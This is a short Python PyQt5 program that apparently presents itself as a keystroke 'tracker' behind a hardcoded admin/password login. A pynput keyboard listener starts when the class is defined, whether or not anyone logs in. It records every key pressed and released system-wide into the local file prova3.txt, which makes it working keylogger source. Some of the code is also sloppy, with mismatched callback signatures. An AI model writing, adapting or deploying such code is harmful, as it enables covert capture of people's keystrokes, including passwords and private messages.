from PyQt5.QtWidgets import *
from PyQt5 import uic
from pynput import keyboard
import os



if os.path.exists("prova3.txt"):
    f = open("prova3.txt", "a")
else:
    f = open("prova3.txt", "x")



class MyGUI(QMainWindow):
    
    def __init__(self):
        super(MyGUI, self).__init__()
        uic.loadUi('mygui.ui', self)
        self.show()
        
        self.pushButton.clicked.connect(self.login)
        self.pushButton_2.clicked.connect(self.on_clicked)
        
        self.actionStop_and_Exit_Tracker.triggered.connect(exit)
        
     
    def login(self):
        if self.lineEdit.text() == 'admin' and self.lineEdit_2.text() == 'password':
            self.pushButton_2.setEnabled(True)
            
            
        else:
            message = QMessageBox()
            message.setText('Invalid Login')
            message.exec_()
    
    
  
                
    def on_clicked(key):
        

            try:
                    f.writelines("///key [ {0} ] pressed ///".format(
                        key.char))
            except AttributeError:
                    f.writelines("///special key {0} pressed///".format(
                        key))
                    f.flush()

    def on_release(key):
            text = ("///key [ {0} ] released ///".format(
                key))
            f.writelines(f'{text} \n')
            f.flush()

    listener = keyboard.Listener(
        on_press= on_clicked
,
        on_release=on_release)
    listener.start()
        
        
            
    
            
def main():
    app =  QApplication([])
    window = MyGUI()
    window.show()
    app.exec_()
    f.close()     
    
          
if __name__ == '__main__':
        main()
        
